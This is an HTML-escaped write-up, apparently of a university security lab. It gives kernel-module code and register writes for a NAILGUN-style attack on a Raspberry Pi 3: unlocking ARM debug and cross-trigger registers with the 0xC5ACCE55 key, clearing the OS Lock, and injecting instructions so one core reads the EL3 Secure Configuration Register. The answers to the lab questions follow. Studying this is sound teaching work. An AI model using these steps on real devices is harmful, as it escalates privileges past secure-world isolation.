&lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;asm/io.h&gt;static int __init dbgauth_init(void)&#123;        uint32_t reg;        printk(KERN_INFO&quot;dbgauth_module: init - attempt to read DBGAUTHSTATUS\\n&quot;);        /* 读取 DBGAUTHSTATUS:         * MRC p14, 0, &lt;Rt&gt;, c7, c14, 6         */        asm volatile(&quot;mrc p14, 0, %0, c7, c14, 6&quot; : &quot;=r&quot;(reg));        printk(KERN_INFO&quot;dbgauth_module: DBGAUTHSTATUS = 0x%08x\\n&quot;, reg);                return 0;&#125;static void __exit dbgauth_exit(void)&#123;        printk(KERN_INFO &quot;dbgauth_module: exit\\n&quot;);&#125;module_init(dbgauth_init);module_exit(dbgauth_exit);\nWe can get DBGAUTHSTATUS after installing this kernel module\n\n\nTask 3.b : What kind of debug events are enabled?\n\n\n\n\nField\nBits\nValue\nMeaning\n\n\n\n\nSNID\n7–6\n11\nSecure Non-invasive debug enabled\n\n\nSID\n5–4\n11\nSecure Invasive debug enabled\n\n\nNSNID\n3–2\n11\nNon-secure Non-invasive debug enabled\n\n\nNSID\n1–0\n11\nNon-secure Invasive debug enable\n\n\n\nTask 4: Enable the Halting\nDebug\n\nWe can find that EDLAR_OFFSET=0xFB0\n\nWrite the key value to unlock\niowrite32(0xC5ACCE55, param-&gt;debug_register + EDLAR_OFFSET);iowrite32(0xC5ACCE55, param-&gt;cti_register + EDLAR_OFFSET);\n\nWe can find that OSLAR_OFFSET=0x300\n\nWriting 0 to the OSLK bit unlocks the OS,\niowrite32(0, param-&gt;debug_register + OSLAR_OFFSET);iowrite32(0, param-&gt;cti_register + OSLAR_OFFSET);\nTask 5: Switch to the\nEL3 and read the SCR\n​ Task5.a: We mention how to access SCR directly in Task2. You need to\nprepare an instruction, who reads SCR and store it to R1. Then convert\nit to machine code(do it on yourself) and execute it on the target.\nmrc p15,0,R1,c1,c1,0\nuse Online\nAssembler and Disassembler to assemble this instruction. It yields\n\\x11\\x1f\\x11\\xee (Little Endian).\n\n\nNote: In EDITR, hw2 (bits [31:16]) is\nthe second halfword and hw1 (bits [15:0]) is the first\nhalfword of the T32 instruction. They are displayed in a nonstandard\norder (hw2 on the left, hw1 on the right).\n\nIn terms of a 32-bit value for C code execution:\n// 0xee111f11 &lt;=&gt; mrc p15,0,R1,c1,c1,0execute_ins_via_itr(param-&gt;debug_register, 0x1f11ee11);\n​ Task 5.b: After you finish Task 5.a , you need to transfer the value\nin R1 on core0, to the local variable scr. It will be printed later.\nDBGDTRTXint and DBGDTRTX would be helpful in your implementation\n\n\nDBGDTRTXint is a 32-bit debug register that allows\nthe processor to transfer data to an external debugger. It is accessed\nusing the MCR instruction, for example:\nMCR p14, 0, Rt, c0, c5, 0\nIn terms of a 32-bit value for C code execution:\n// ee001e15 &lt;=&gt; mcr p14,0,R1,c0,c5,0execute_ins_via_itr(param-&gt;debug_register, 0x1e15ee00);\nRegister DBGDTRTXint bits [31:0] are architecturally mapped to\nDBGDTRTX_EL0[31:0].\nscr = ioread32(param-&gt;debug_register + DBGDTRTX_OFFSET);\nTask 6: Restore the Context\nand Exit\n\nThe value of SCR is\n0x00000131(0b100110001)\n\nKey meanings of SCR = 0x131\n\nPE is in Non-secure state.\nAn FIQ taken from either Security state is masked by PSTATE.F.\nWhen PSTATE.F is 0, the FIQ is taken to EL3.\nExternal aborts taken from either Security state are masked by\nPSTATE.A. When PSTATE.A is 0, the abort is taken to EL3.\nHVC instructions are enabled at Non-secure EL1 and EL2.\n\nQuestion 1:\nDuring this lab, what is the base address of Cross Trigger Interface\nin Raspberry Pi 3? Can your find the global address of CTICONTROL\nregister in Raspberry Pi 3 according to the Arm Reference Manual? Answer\nthe address value and show your calculation. (hint: Find the offset)\n// 0x40038000 is the base address of the cross trigger interface registers on Core 0#define CTI_REGISTER_ADDR 0x40038000\n\nThe global address of the CTICONTROL register is\ncalculated as:\n$$\\begin{aligned} \\text{Global Address}\n&amp;= \\text{Base Address} + \\text{Offset} \\\\ &amp;= 0\\text{x}40038000 +\n0\\text{x}0 \\\\ &amp;= \\mathbf{0\\text{x}40038000}\n\\end{aligned}$$\nTherefore, the CTICONTROL register is located at address\n0x40038000.\nQuestion 2:\nDo we have another way to unlock the OS Lock in this lab except\nmemory mapping? If yes, how to do that? Justify your answer.\n\nExtract Step 1 (the part that unlocks debug and cross-trigger\nregisters) from the read_scr() function, and modify it so\nthat instead of unlocking the OS Lock, it locks it.\nstatic void read_scr1(void *addr)&#123;    // Step 1: Unlock debug and cross trigger reigsters    struct nailgun_param *param = (struct nailgun_param*)addr;    printk(KERN_INFO&quot;Step 1: Unlock debug and cross trigger registers\\n&quot;);    iowrite32(0xC5ACCE55, param-&gt;debug_register + EDLAR_OFFSET);    iowrite32(0xC5ACCE55, param-&gt;cti_register + EDLAR_OFFSET);    printk(KERN_INFO&quot;Step 1(Add): Lock OS registers\\n&quot;);    iowrite32(0xC5ACCE55, param-&gt;debug_register + OSLAR_OFFSET);    iowrite32(0xC5ACCE55, param-&gt;cti_register + OSLAR_OFFSET);&#125;\nunlock the OS Lock by executing the code directly on core\n0.\nstatic void unlock_debug(void* _) &#123;\t// Unlock self debug registers\tprintk(KERN_INFO &quot;Step 1(Add): unlock the OS Lock not using MAP\\n&quot;);\tuint32_t reg = 0;\tasm volatile(&quot;mcr p14, 0, %0, c1, c0, 4&quot;:&quot;=r&quot;(reg));&#125;\nChange nailgun_init as follows:\nsmp_call_function_single(1,read_scr1,param,1);smp_call_function_single(0, unlock_debug, param, 1);smp_call_function_single(1,read_scr,param,1);\nTherefore, we can unlock the OS Lock in this lab except memory\nmapping\n\n","categories":["Computer Science"],"tags":["Security","Linux","Attack","ARM"]}]